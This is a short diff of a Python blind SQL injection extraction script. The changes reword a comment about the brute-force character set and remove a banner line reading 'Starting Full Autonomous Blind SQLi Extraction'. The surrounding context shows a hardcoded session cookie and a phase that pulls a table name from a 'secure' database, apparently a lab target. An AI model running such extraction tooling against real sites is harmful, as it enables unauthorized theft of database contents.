@@ -9,7 +9,7 @@ my_cookies = {
     'PHPSESSID': '14a6773ab6444749b4c46e19a6bdd25c'
 }
 
-# options of charachters: abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-
+# options of charachters: all of alphabet, including capital letters, all of the digits, and "_", "-"
 alphabet = string.ascii_letters + string.digits + "_- "
 
 def check_connection():
@@ -46,8 +46,6 @@ def extract_data(query, max_length=70):
     return extracted
 
 if __name__ == "__main__":
-    print("Starting Full Autonomous Blind SQLi Extraction \n")
-    
     if check_connection():
         print("Phase 0: Extracting table name from 'secure' database...")
 
